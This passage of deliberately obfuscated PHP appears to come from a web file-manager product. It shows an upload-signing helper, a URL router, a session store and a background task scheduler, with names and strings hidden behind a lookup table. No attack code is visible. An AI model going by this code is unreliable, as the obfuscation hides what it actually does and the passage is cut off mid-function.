$ö‰«Î, $…€€ÒÒ[285] => $›Œãœƒ, $…€€ÒÒ[293] => $á‹ğ¥¿ë, $…€€ÒÒ[294] => $áõ™îŸ, $…€€ÒÒ[295] => $×ñÃü¦, $…€€ÒÒ[296] => $ñ¸òÓ…, $…€€ÒÒ[297] => $´á¨ñœ, $…€€ÒÒ[298] => $­êô­‹–, $…€€ÒÒ[208] => $this->getHost()); return $Ó˜ÉĞëˆ; } public function multiUploadFormData($Á»ö‰™Ë, $íÖ’ŸıŠ = 3600) { $ªåôŒŒñ =& $_SERVER[¦»×‡Ãã]; $µ·Ô™‹ = gmdate($ªåôŒŒñ[300]); $Ã–¨Ëªö = array(); $ÓÎ«Óîæ = $this->client->getUploadId($this->bucket, $Á»ö‰™Ë, $Ã–¨Ëªö); if (!$ÓÎ«Óîæ) { return !1; } return array($ªåôŒŒñ[254] => $ÓÎ«Óîæ, $ªåôŒŒñ[208] => $this->getHost() . $ªåôŒŒñ[8] . $this->pathEncode($Á»ö‰™Ë), $ªåôŒŒñ[255] => $µ·Ô™‹, $ªåôŒŒñ[97] => $Á»ö‰™Ë); } public function multiUploadAuthData($Ç Õ£Ä°, $¨““±ÍŠ = array()) { $ÖÄÌûë¹ =& $_SERVER[¦»×‡Ãã]; $Ğˆµæ‘² = isset($¨““±ÍŠ[$ÖÄÌûë¹[169]]) ? $¨““±ÍŠ[$ÖÄÌûë¹[169]] : $ÖÄÌûë¹[12]; $Š¯°ÑÛ– = $¨““±ÍŠ[$ÖÄÌûë¹[97]]; unset($¨““±ÍŠ[$ÖÄÌûë¹[97]]); if (isset($¨““±ÍŠ[$ÖÄÌûë¹[256]])) { return $this->listUploadParts($Š¯°ÑÛ–, $¨““±ÍŠ); } $“¦£Ù = array(); if (isset($¨““±ÍŠ[$ÖÄÌûë¹[301]])) { $“¦£Ù[$ÖÄÌûë¹[302]] = $¨““±ÍŠ[$ÖÄÌûë¹[301]]; } $“úÇí = explode($ÖÄÌûë¹[210], $this->getHost()); $¤¶Ò¼—Æ = array($ÖÄÌûë¹[303] => $“úÇí[1], $ÖÄÌûë¹[304] => $ÖÄÌûë¹[12], $ÖÄÌûë¹[246] => $ÖÄÌûë¹[123], $ÖÄÌûë¹[292] => $¨““±ÍŠ[$ÖÄÌûë¹[79]]); $¸ÊÆ‘º = $ÖÄÌûë¹[259]; $ÑĞ¢÷‹ò = $ÖÄÌûë¹[8] . $this->pathEncode($Š¯°ÑÛ–) . $Ğˆµæ‘²; $ÙƒÏÌ·Á = $this->client->__getSignatureV4($“¦£Ù, $¤¶Ò¼—Æ, $¸ÊÆ‘º, $ÑĞ¢÷‹ò); if (strpos($Ğˆµæ‘², $ÖÄÌûë¹[258]) === 0) { if (isset($“¦£Ù[$ÖÄÌûë¹[302]])) { $Ä±Ø = $“¦£Ù[$ÖÄÌûë¹[302]]; } else { if (isset($ÙƒÏÌ·Á[$ÖÄÌûë¹[302]])) { $Ä±Ø = $ÙƒÏÌ·Á[$ÖÄÌûë¹[302]]; } else { $Ä±Ø = hash($ÖÄÌûë¹[290], $ÖÄÌûë¹[12]); } } return array($ÖÄÌûë¹[265] => $ÙƒÏÌ·Á[$ÖÄÌûë¹[265]], $ÖÄÌûë¹[302] => $Ä±Ø, $ÖÄÌûë¹[255] => $ÙƒÏÌ·Á[$ÖÄÌûë¹[305]]); } return $ÙƒÏÌ·Á[$ÖÄÌûë¹[265]]; } public function listUploadParts($£…¦×Óï, $ˆñú‡²Ç = array()) { $èğš€Ò =& $_SERVER[¦»×‡Ãã]; $Ôâ€¶¾Ş = str_replace($èğš€Ò[266], $èğš€Ò[12], $ˆñú‡²Ç[$èğš€Ò[169]]); $Š¦§òóß = $this->client->listParts($this->bucket, $£…¦×Óï, $Ôâ€¶¾Ş); if (!$Š¦§òóß) { return !1; } $¬·û£˜Ş = $èğš€Ò[306]; foreach ($Š¦§òóß as $£·İâœ¬) { $¬·û£˜Ş .= $èğš€Ò[307] . "\74\x50\x61\x72\164\x4e\165\x6d\x62\145\x72\x3e{$£·İâœ¬[$èğš€Ò[308]]}\x3c\x2f\x50\141\x72\x74\x4e\x75\155\142\x65\x72\76\12" . "\x3c\105\x54\x61\147\76{$£·İâœ¬[$èğš€Ò[309]]}\x3c\57\105\x54\141\x67\x3e\xa" . $èğš€Ò[310]; } $¬·û£˜Ş .= $èğš€Ò[311]; $ƒ›Š¹¶ = array(); $Äù³çöŠ = explode($èğš€Ò[210], $this->getHost()); $İ»•´¬Í = array($èğš€Ò[303] => $Äù³çöŠ[1], $èğš€Ò[246] => $èğš€Ò[123], $èğš€Ò[292] => strlen($¬·û£˜Ş)); $âµĞª…× = $èğš€Ò[257]; $¢Ô‰›ÆÙ = $èğš€Ò[8] . $this->pathEncode($£…¦×Óï) . $ˆñú‡²Ç[$èğš€Ò[169]]; $Åè¯”ı = $this->client->__getSignatureV4($ƒ›Š¹¶, $İ»•´¬Í, $âµĞª…×, $¢Ô‰›ÆÙ, $¬·û£˜Ş); return array($èğš€Ò[265] => $Åè¯”ı[$èğš€Ò[265]], $èğš€Ò[255] => $Åè¯”ı[$èğš€Ò[305]], $èğš€Ò[267] => $Š¦§òóß, $èğš€Ò[302] => $Åè¯”ı[$èğš€Ò[302]]); } public function link($ãÍÕ¥ˆ·, $ıÈ»‡å = array()) { return parent::link($ãÍÕ¥ˆ·, $ıÈ»‡å); } public function fileOut($ñÆªîùÃ, $Ö´¿òƒô = false, $è˜‘ƒíØ = false, $¾ƒ–´Ğ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¦»×‡Ãã][312])) { return parent::fileOutServer($ñÆªîùÃ, $Ö´¿òƒô, $è˜‘ƒíØ, $¾ƒ–´Ğ); } parent::fileOut($ñÆªîùÃ, $Ö´¿òƒô, $è˜‘ƒíØ, $¾ƒ–´Ğ); } public function fileOutImage($È†åûò, $äÏÏÅ³È = 250) { if (strstr($this->endpoint, $_SERVER[¦»×‡Ãã][312])) { return parent::fileOutImageServer($È†åûò, $äÏÏÅ³È); } parent::fileOutImage($È†åûò, $äÏÏÅ³È); } public function fileOutLink($ÍÍ§‹‘¨) { $Ã³†¦ë‚ =& $_SERVER[¦»×‡Ãã]; if (substr($ÍÍ§‹‘¨, 0, 7) == $Ã³†¦ë‚[313]) { $ÍÍ§‹‘¨ = $Ã³†¦ë‚[314] . substr($ÍÍ§‹‘¨, 7); } header($Ã³†¦ë‚[175] . $ÍÍ§‹‘¨); die; } } define($_SERVER[¦»×‡Ãã][315], 1); define($_SERVER[¦»×‡Ãã][316], 2); goto C˜ÇÁƒšø; B¦—ìÇ±Ô: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\133\x5e\x2f\135\53", "\x3a\x6e\165\x6d" => "\x5b\60\55\x39\135\53", "\x3a\x61\x6c\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($ÇÑæşç, $ã‡°µ“™) { $çÂğû =& $_SERVER[¦»×‡Ãã]; if ($ÇÑæşç == $çÂğû[1708]) { $‹½ç÷Ù€ = array_map($çÂğû[1709], $ã‡°µ“™[0]); $Ú×±ÂÃ¬ = strpos($ã‡°µ“™[1], $çÂğû[8]) === 0 ? $ã‡°µ“™[1] : $çÂğû[8] . $ã‡°µ“™[1]; $¶ä¨åÃ­ = $ã‡°µ“™[2]; } else { $‹½ç÷Ù€ = null; $Ú×±ÂÃ¬ = strpos($ã‡°µ“™[0], $çÂğû[8]) === 0 ? $ã‡°µ“™[0] : $çÂğû[8] . $ã‡°µ“™[0]; $¶ä¨åÃ­ = $ã‡°µ“™[1]; } array_push(self::$maps, $‹½ç÷Ù€); array_push(self::$routes, $Ú×±ÂÃ¬); array_push(self::$methods, strtoupper($ÇÑæşç)); array_push(self::$callbacks, $¶ä¨åÃ­); } public static function error($ùœ°Ùè·) { self::$errorCallback = $ùœ°Ùè·; } public static function haltOnMatch($ô­ö¬Ÿğ = true) { self::$halts = $ô­ö¬Ÿğ; } public static function dispatch() { $·€ÛÉ­ =& $_SERVER[¦»×‡Ãã]; $“Æ€ÈåÎ = parse_url($_SERVER[$·€ÛÉ­[1710]], PHP_URL_PATH); $ëç‹ù—ç = $_SERVER[$·€ÛÉ­[164]]; $¸÷ßğ˜Œ = array_keys(static::$patterns); $ñŞª‘š‚ = array_values(static::$patterns); $÷×¦§˜¡ = !1; self::$routes = preg_replace($·€ÛÉ­[1361], $·€ÛÉ­[8], self::$routes); if (in_array($“Æ€ÈåÎ, self::$routes)) { $Ü›ƒ¬æş = array_keys(self::$routes, $“Æ€ÈåÎ); foreach ($Ü›ƒ¬æş as $ª§Ö®) { if (self::$methods[$ª§Ö®] == $ëç‹ù—ç || self::$methods[$ª§Ö®] == $·€ÛÉ­[1711] || in_array($ëç‹ù—ç, self::$maps[$ª§Ö®])) { $÷×¦§˜¡ = !0; if (!is_object(self::$callbacks[$ª§Ö®])) { $•Šƒù‹´ = explode($·€ÛÉ­[8], self::$callbacks[$ª§Ö®]); $Üè°šÍµ = end($•Šƒù‹´); $ÉÅÓô = explode($·€ÛÉ­[1293], $Üè°šÍµ); $ÅÏÛØÄ = new $ÉÅÓô[0](); $ÅÏÛØÄ->{$ÉÅÓô[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ª§Ö®]); if (self::$halts) { return; } } } } } else { $¿ŞËŞ‘Û = 0; foreach (self::$routes as $ª§Ö®) { if (strpos($ª§Ö®, $·€ÛÉ­[4]) !== !1) { $ª§Ö® = str_replace($¸÷ßğ˜Œ, $ñŞª‘š‚, $ª§Ö®); } if (preg_match($·€ÛÉ­[1712] . $ª§Ö® . $·€ÛÉ­[1713], $“Æ€ÈåÎ, $ÆâìØ×…)) { if (self::$methods[$¿ŞËŞ‘Û] == $ëç‹ù—ç || self::$methods[$¿ŞËŞ‘Û] == $·€ÛÉ­[1711] || !empty(self::$maps[$¿ŞËŞ‘Û]) && in_array($ëç‹ù—ç, self::$maps[$¿ŞËŞ‘Û])) { $÷×¦§˜¡ = !0; array_shift($ÆâìØ×…); if (!is_object(self::$callbacks[$¿ŞËŞ‘Û])) { $•Šƒù‹´ = explode($·€ÛÉ­[8], self::$callbacks[$¿ŞËŞ‘Û]); $Üè°šÍµ = end($•Šƒù‹´); $ÉÅÓô = explode($·€ÛÉ­[1293], $Üè°šÍµ); $ÅÏÛØÄ = new $ÉÅÓô[0](); if (!method_exists($ÅÏÛØÄ, $ÉÅÓô[1])) { echo $·€ÛÉ­[1714]; } else { call_user_func_array(array($ÅÏÛØÄ, $ÉÅÓô[1]), $ÆâìØ×…); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$¿ŞËŞ‘Û], $ÆâìØ×…); if (self::$halts) { return; } } } } $¿ŞËŞ‘Û++; } } if ($÷×¦§˜¡ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ ÅıÁ¢ó =& $_SERVER[¦»×‡Ãã]; header($_SERVER[$ ÅıÁ¢ó[1715]] . $ ÅıÁ¢ó[1716]); echo $ ÅıÁ¢ó[1717]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$·€ÛÉ­[1710]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ÃŒ¢È =& $_SERVER[¦»×‡Ãã]; static $‘ÉÊ‘º« = false; if ($‘ÉÊ‘º«) { return $‘ÉÊ‘º«; } $äüòÃğı = $GLOBALS[$ÃŒ¢È[6]][$ÃŒ¢È[425]]; self::$sessionTime = $äüòÃğı[$ÃŒ¢È[1718]]; $§ÃÙ¿¶¨ = isset($GLOBALS[$ÃŒ¢È[1719]]) ? $GLOBALS[$ÃŒ¢È[1719]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($§ÃÙ¿¶¨)) { self::$sessionSign = Cookie::get($§ÃÙ¿¶¨); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($§ÃÙ¿¶¨, self::$sessionSign, self::$sessionTime); $Û²üßÌñ = $äüòÃğı[$ÃŒ¢È[1720]]; $¶ºÙ‰Ğä = $äüòÃğı[$Û²üßÌñ]; $ìŒù«”ù = $äüòÃğı[$ÃŒ¢È[900]]; switch ($Û²üßÌñ) { case $ÃŒ¢È[21]: self::$handle = Model($ÃŒ¢È[901]); break; case $ÃŒ¢È[902]: self::$handle = new CacheRedis($¶ºÙ‰Ğä, $ìŒù«”ù); break; case $ÃŒ¢È[903]: self::$handle = new CacheMemcached($¶ºÙ‰Ğä, $ìŒù«”ù); break; case $ÃŒ¢È[230]: $¶ºÙ‰Ğä[$ÃŒ¢È[87]] = $¶ºÙ‰Ğä[$ÃŒ¢È[87]] . $ÃŒ¢È[1721]; self::$handle = new CacheFile($¶ºÙ‰Ğä, $ìŒù«”ù); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $‘ÉÊ‘º« = new self(); return $‘ÉÊ‘º«; } public static function getBySign($›´ÄÄÍ†) { $”¼¦Œ÷ò = self::$handle->get($›´ÄÄÍ†); $”¼¦Œ÷ò = unserialize($”¼¦Œ÷ò); return is_array($”¼¦Œ÷ò) ? $”¼¦Œ÷ò : array(); } public static function setBySign($à°‰ã¯¾, $ ÊÃ»©ß) { CacheLock::lock($à°‰ã¯¾); self::$handle->set($à°‰ã¯¾, serialize($ ÊÃ»©ß), self::$sessionTime); CacheLock::unlock($à°‰ã¯¾); } public static function sign($¿ˆÆÆåá = false) { if ($¿ˆÆÆåá) { self::$sessionSign = $¿ˆÆÆåá; } self::init(); return self::$sessionSign; } public static function set($ôİ§ƒ”›, $ ¶•â‘´ = false) { self::init(); if (is_array($ôİ§ƒ”›)) { foreach ($ôİ§ƒ”› as $¸Â—¡Â => $ª•ü‡¥¸) { array_set_value(self::$data, $¸Â—¡Â, $ª•ü‡¥¸); } } else { array_set_value(self::$data, $ôİ§ƒ”›, $ ¶•â‘´); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ŸÛŸı’ = false) { self::init(); if (!$ŸÛŸı’) { return self::$data; } return array_get_value(self::$data, $ŸÛŸı’); } public static function remove($¬ÂÜÂıæ) { self::init(); unset(self::$data[$¬ÂÜÂıæ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¦»×‡Ãã][906])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ºë†İ£¬ =& $_SERVER[¦»×‡Ãã]; if (self::valueGet($ºë†İ£¬[823]) != $ºë†İ£¬[91]) { return; } if (self::valueGet($ºë†İ£¬[1722]) == $ºë†İ£¬[91]) { $üáÒ±îù = self::valueGet($ºë†İ£¬[1723]); if (time() - $üáÒ±îù > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ºë†İ£¬[1722], $ºë†İ£¬[91]); self::log($ºë†İ£¬[1724] . ACTION . $ºë†İ£¬[1725]); Hook::bind($ºë†İ£¬[1726], $ºë†İ£¬[1727]); $”×ÜÌÜ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ºë†İ£¬[823]) != $ºë†İ£¬[91]) { self::valueSet($ºë†İ£¬[1722], $ºë†İ£¬[228]); self::log($ºë†İ£¬[1728]); die; } $›»£ĞÙÉ = time(); if ($›»£ĞÙÉ - $”×ÜÌÜ >= 60) { self::valueSet(array($ºë†İ£¬[1722] => $ºë†İ£¬[91], $ºë†İ£¬[1723] => $›»£ĞÙÉ)); $”×ÜÌÜ = $›»£ĞÙÉ; } if (!file_exists(USER_SYSTEM . $ºë†İ£¬[1729])) { self::valueSet(array($ºë†İ£¬[1722] => $ºë†İ£¬[228], $ºë†İ£¬[823] => $ºë†İ£¬[228])); self::log($ºë†İ£¬[1730]); die; } $¤ì³ªË— = file_get_contents(BASIC_PATH . $ºë†İ£¬[1731]); $úé¥ÑšÄ = KOD_VERSION . $ºë†İ£¬[10] . KOD_VERSION_BUILD; $„á¦Ì‡ = match_text($¤ì³ªË—, $ºë†İ£¬[1732]) . $ºë†İ£¬[10] . match_text($¤ì³ªË—, $ºë†İ£¬[1733]); if ($„á¦Ì‡ != $úé¥ÑšÄ) { self::restart(); self::log("\x73\164\157\x70\145\144\56\133\166\145\162\163\x69\157\156\40\165\x70\x64\141\x74\145\73{$versionNow}\x20\75\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ÅÂü ”À =& $_SERVER[¦»×‡Ãã]; http_close(); $GLOBALS[$ÅÂü ”À[1734]] = 1; $_SERVER[$ÅÂü ”À[1735]] = $ÅÂü ”À[1736]; $_COOKIE = array(); $GLOBALS[$ÅÂü ”À[1737]] = 1; $GLOBALS[$ÅÂü ”À[1738]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Ç˜Ğô‡µ =& $_SERVER[¦»×‡Ãã]; http_close(); self::valueSet($Ç˜Ğô‡µ[823], $Ç˜Ğô‡µ[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Ç˜Ğô‡µ[1722] => $Ç˜Ğô‡µ[228], $Ç˜Ğô‡µ[823] => $Ç˜Ğô‡µ[91])); self::log($Ç˜Ğô‡µ[1739]); } public static function taskSwitch() { $é±¡½ØÔ =& $_SERVER[¦»×‡Ãã]; $«Üß¿àÎ = self::valueGet($é±¡½ØÔ[823]) == $é±¡½ØÔ[91] ? $é±¡½ØÔ[228] : $é±¡½ØÔ[91]; self::valueSet($é±¡½ØÔ[823], $«Üß¿àÎ); } public static function shutdownEvent() { $ï˜‡ÁÄ =& $_SERVER[¦»×‡Ãã]; self::valueSet($ï˜‡ÁÄ[1722], $ï˜‡ÁÄ[228]); self::log($ï˜‡ÁÄ[1740]); } public static function config($Ğ ÚôĞŒ, $ŸÌ‡Ã¿†) { self::valueSet($_SERVER[¦»×‡Ãã][823], $Ğ ÚôĞŒ); } private static function taskRunAll() { $ñËƒ–ÙÕ =& $_SERVER[¦»×‡Ãã]; $ï¦¼©™¦ = timeFloat(); $ªÒå¢ŞÔ = Model($ñËƒ–ÙÕ[1741])->listData(); $·ĞáÕ† = count($ªÒå¢ŞÔ); for ($©»ÆÆ¾ = 0; $©»ÆÆ¾ < $·ĞáÕ†; $©»ÆÆ¾++) { $¶Ñ½’¯Ñ = $ªÒå¢ŞÔ[$©»ÆÆ¾]; if (!$¶Ñ½’¯Ñ[$ñËƒ–ÙÕ[475]] || $¶Ñ½’¯Ñ[$ñËƒ–ÙÕ[1742]] != $ñËƒ–ÙÕ[91]) { continue; } if (!self::taskTimeCheck($¶Ñ½’¯Ñ)) { continue; } self::taskRun($¶Ñ½’¯Ñ); } Hook::trigger($ñËƒ–ÙÕ[1743]); self::taskQueueRun($ï¦¼©™¦); } private static function taskQueueRun($ÉÀú¡) { $¼ÓòÙÏ = 10; while (!0) { $¼òíÅ¨¶ = TaskQueue::run(); if ($¼òíÅ¨¶ === !1) { break; } if (timeFloat() - $ÉÀú¡ >= $¼ÓòÙÏ) { break; } } } private static function taskTimeCheck($´ĞÒ×—ù) { $ÁÀ·£× =& $_SERVER[¦»×‡Ãã]; $Üµ„Ë¾ = json_decode($´ĞÒ×—ù[$ÁÀ·£×[206]], !0); $¶ËÊåõÉ = intval($´ĞÒ×—ù[$ÁÀ·£×[1723]]); $’™óéÄÔ = strtotime($ÁÀ·£×[1744] . $Üµ„Ë¾[$ÁÀ·£×[1745]] . $ÁÀ·£×[1746]) - strtotime($ÁÀ·£×[1747]); $Ö‚Ê­±ç = time() - strtotime(date($ÁÀ·£×[1748]) . $ÁÀ·£×[1749]); $ÍˆË›Óã = $Ö‚Ê­±ç >= $’™óéÄÔ && $Ö‚Ê­±ç <= $’™óéÄÔ + 3600; switch ($Üµ„Ë¾[$ÁÀ·£×[33]]) { case $ÁÀ·£×[1750]: if (time() - $¶ËÊåõÉ < 3600 * 24 * 30) { return !1; } if ($Üµ„Ë¾[$ÁÀ·£×[1750]] == date($ÁÀ·£×[1751]) && $ÍˆË›Óã) { return !0; } break; case $ÁÀ·£×[1752]: if (time() - $¶ËÊåõÉ < 3600 * 24 * 7) { return !1; } $¹â³ØÏ = date($ÁÀ·£×[1753]) == 0 ? 7 : date($ÁÀ·£×[1753]); if ($Üµ„Ë¾[$ÁÀ·£×[1752]] == $¹â³ØÏ && $ÍˆË›Óã) { return !0; } break; case $ÁÀ·£×[1745]: if (time() - $¶ËÊåõÉ < 3600 * 24) { return !1; } if ($ÍˆË›Óã) { return !0; } break; case $ÁÀ·£×[1754]: if (time() - $¶ËÊåõÉ >= floatval($Üµ„Ë¾[$ÁÀ·£×[1754]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¼áËöÏÆ =& $_SERVER[¦»×‡Ãã]; static $¸¥•±¯‡ = 0; $·İô¨¢ˆ = 300; if (!$¸¥•±¯‡) { $¸¥•±¯‡ = time(); } if (time() - $¸¥•±¯‡ < $·İô¨¢ˆ) { return; } $¸¥•±¯‡ = time(); $ïŞ¥ˆÀ“ = Model($¼áËöÏÆ[577])->db($¼áËöÏÆ[12]); if ($ïŞ¥ˆÀ“) { $ïŞ¥ˆÀ“->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¼áËöÏÆ[1755], $¼áËöÏÆ[1756]); die; } } public static function taskRun($Êë¨†Î³) { $òÕó÷‰ =& $_SERVER[¦»×‡Ãã]; self::log($òÕó÷‰[1757] . $Êë¨†Î³[$òÕó÷‰[475]] . $òÕó÷‰[1758] . $Êë¨†Î³[$òÕó÷‰[32]] . $òÕó÷‰[1759] . $Êë¨†Î³[$òÕó÷‰[1760]]); Model($òÕó÷‰[1741])->run($Êë¨†Î³[$òÕó÷‰[475]]); $Ïú­¹³Ø = timeFloat(); $¸°…ÚØ² = $òÕó÷‰[12]; switch ($Êë¨†Î³[$òÕó÷‰[33]]) { case $òÕó÷‰[383]: $Ê§“™›Š = url_request($Êë¨†Î³[$òÕó÷‰[1760]], $òÕó÷‰[261], !1, !1, !1, !1, 10); if ($Ê§“™›Š[$òÕó÷‰[823]]) { $¸°…ÚØ² = strlen($Ê§“™›Š[$òÕó÷‰[1287]]); } break; case $òÕó÷‰[260]: $¸°…ÚØ² = Hook::apply($Êë¨†Î³[$òÕó÷‰[1760]]); default: break; } Model($òÕó÷‰[1761])->add(array($òÕó÷‰[1762] => $òÕó÷‰[12], $òÕó÷‰[1763] => $òÕó÷‰[228], $òÕó÷‰[33] => $òÕó÷‰[1764] . $Êë¨†Î³[$òÕó÷‰[475]], $òÕó÷‰[1765] => json_encode(array($òÕó÷‰[32] => $Êë¨†Î³[$òÕó÷‰[32]], $òÕó÷‰[1766] => timeFloat() - $Ïú­¹³Ø, $òÕó÷‰[369] => $¸°…ÚØ²)))); $•Âµòğ  = $¸°…ÚØ² ? $òÕó÷‰[1767] . $¸°…ÚØ² : $òÕó÷‰[12]; self::log($òÕó÷‰[1768] . $Êë¨†Î³[$òÕó÷‰[475]] . $òÕó÷‰[178] . $•Âµòğ ); return !0; } public static function valueGet($†Şßƒî×) { $…øğÃ´  =& $_SERVER[¦»×‡Ãã]; $£±ì¤±  = $…øğÃ´ [1769]; $”´¾äÓ = Model($…øğÃ´ [508])->get($†Şßƒî×, $£±ì¤± ); if (is_null($”´¾äÓ)) { Model($…øğÃ´ [508])->set($…øğÃ´ [823], $…øğÃ´ [91], $£±ì¤± ); Model($…øğÃ´ [508])->set($…øğÃ´ [1722], $…øğÃ´ [228], $£±ì¤± ); $”´¾äÓ = Model($…øğÃ´ [508])->get($†Şßƒî×, $£±ì¤± ); } return $”´¾äÓ; } private static function valueSet($¹ûÔØÉ¨, $‡íÒ±’ = false) { $öô¤å± =& $_SERVER[¦»×‡Ãã]; $õÒøÒ¢• = $öô¤å±[1770]; CacheLock::lock($õÒøÒ¢•); $ĞåàĞ›’ = Model($öô¤å±[508])->set($¹ûÔØÉ¨, $‡íÒ±’, $öô¤å±[1769]); CacheLock::unlock($õÒøÒ¢•); return $ĞåàĞ›’; } protected static function log($¥½˜ªıµ) { write_log($¥½˜ªıµ, $_SERVER[¦»×‡Ãã][1756]); } private static function cacheClear() { $ÚÚÅ‘Ã =& $_SERVER[¦»×‡Ãã]; Cache::clearMemory(Model($ÚÚÅ‘Ã[508])->cacheKey($ÚÚÅ‘Ã[1769])); Cache::clearMemory(Model($ÚÚÅ‘Ã[508])->cacheKey($ÚÚÅ‘Ã[1771])); Model($ÚÚÅ‘Ã[1741])->cacheClear(); self::closeDatabase(); } } goto CííÖÅ‡½¼; A«íï÷¶…: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ğ•ê¿† =& $_SERVER[¦»×‡Ãã]; $this->objectDriver = array($ğ•ê¿†[60], $ğ•ê¿†[61], $ğ•ê¿†[62], $ğ•ê¿†[63], $ğ•ê¿†[64], $ğ•ê¿†[65], $ğ•ê¿†[66], $ğ•ê¿†[67], $ğ•ê¿†[68], $ğ•ê¿†[69], $ğ•ê¿†[70], $ğ•ê¿†[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($æ˜²ûğ¶) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($æ˜²ûğ¶, $_SERVER[¦»×‡Ãã][8]); } return $æ˜²ûğ¶; } public function iconvApp($ß“‘êµæ) { return $ß“‘êµæ; } public function iconvSystem($Õ¹œÛ¬è) { return $Õ¹œÛ¬è; } public function iconvTo($¢«ˆÎİ, $·è½íÍ, $š’Ó¤™Ó) { $µ©Ì¹îÇ =& $_SERVER[¦»×‡Ãã]; if (!$¢«ˆÎİ || !function_exists($µ©Ì¹îÇ[72])) { return $¢«ˆÎİ; } static $ùÉˆíî… = array(); $Ó‰¾Òà˜ = $·è½íÍ . $µ©Ì¹îÇ[73] . $š’Ó¤™Ó . $µ©Ì¹îÇ[74] . $¢«ˆÎİ; if (isset($ùÉˆíî…[$Ó‰¾Òà˜])) { return $ùÉˆíî…[$Ó‰¾Òà˜]; } if (function_exists($µ©Ì¹îÇ[75])) { $Ñ¤´’Í = @mb_convert_encoding($¢«ˆÎİ, $š’Ó¤™Ó, $·è½íÍ); } else { $Ñ¤´’Í = @iconv($·è½íÍ, $š’Ó¤™Ó, $¢«ˆÎİ); } $Ñ¤´’Í = $Ñ¤´’Í ? $Ñ¤´’Í : $¢«ˆÎİ; if (strstr($Ñ¤´’Í, $µ©Ì¹îÇ[76])) { $Ñ¤´’Í = str_replace($µ©Ì¹îÇ[76], $µ©Ì¹îÇ[11], $Ñ¤´’Í); } $ùÉˆíî…[$·è½íÍ . $µ©Ì¹îÇ[73] . $š’Ó¤™Ó . $µ©Ì¹îÇ[74] . $¢«ˆÎİ] = $Ñ¤´’Í; $ùÉˆíî…[$š’Ó¤™Ó . $µ©Ì¹îÇ[73] . $·è½íÍ . $µ©Ì¹îÇ[74] . $¢«ˆÎİ] = $¢«ˆÎİ; $ùÉˆíî…[$š’Ó¤™Ó . $µ©Ì¹îÇ[73] . $·è½íÍ . $µ©Ì¹îÇ[74] . $Ñ¤´’Í] = $¢«ˆÎİ; $ùÉˆíî…[$·è½íÍ . $µ©Ì¹îÇ[73] . $š’Ó¤™Ó . $µ©Ì¹îÇ[74] . $Ñ¤´’Í] = $Ñ¤´’Í; return $Ñ¤´’Í; } public function getPathInner($ñú¨–) { $Š›ÙğĞ = IO::init($ñú¨–); return $Š›ÙğĞ->path; } public function getPathOuter($’ˆ¿ŸÅö) { $ö‰ôÜê =& $_SERVER[¦»×‡Ãã]; $òÀª¶Ù = strlen(trim($this->pathBase, $ö‰ôÜê[8])); $’ˆ¿ŸÅö = substr(trim($’ˆ¿ŸÅö, $ö‰ôÜê[8]), $òÀª¶Ù); return $this->pathDriver . $ö‰ôÜê[8] . ltrim($’ˆ¿ŸÅö, $ö‰ôÜê[8]); } public function isParentOf($ùåãš–â, $æÏğğ¼) { $ç…£Ã‘ =& $_SERVER[¦»×‡Ãã]; $ùåãš–â = rtrim(strtolower($ùåãš–â), $ç…£Ã‘[8]) . $ç…£Ã‘[8]; $æÏğğ¼ = rtrim(strtolower($æÏğğ¼), $ç…£Ã‘[8]) . $ç…£Ã‘[8]; $©µ½ÛÍœ = strpos($æÏğğ¼, $ùåãš–â) === 0; return $©µ½ÛÍœ; } public function getType() { $Ğ˜Ï¾Ò =& $_SERVER[¦»×‡Ãã]; $Ú‘¨¶ô¦ = str_replace($Ğ˜Ï¾Ò[77], $Ğ˜Ï¾Ò[12], get_class($this)); return strtolower($Ú‘¨¶ô¦); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ô›²ê°¯, $Ô¿œéìß) { $ËÈş„ïê =& $_SERVER[¦»×‡Ãã]; $ÏŠˆ¤Šå = rtrim($Ô›²ê°¯, $ËÈş„ïê[8]) . $ËÈş„ïê[8] . $Ô¿œéìß; $Ï­şğğ© = $this->exist($ÏŠˆ¤Šå); return $Ï­şğğ© ? $ÏŠˆ¤Šå : !1; } public function setModifyTime($•º÷¤˜ò, $ÒÚàÊäï = '') { } public function renameObject($—úî˜ø, $ŸÂºÕ·‡) { $½Ç»¿ = $ŸÂºÕ·‡; $—úî˜ø = $this->getPathOuter($—úî˜ø); $ŸÂºÕ·‡ = 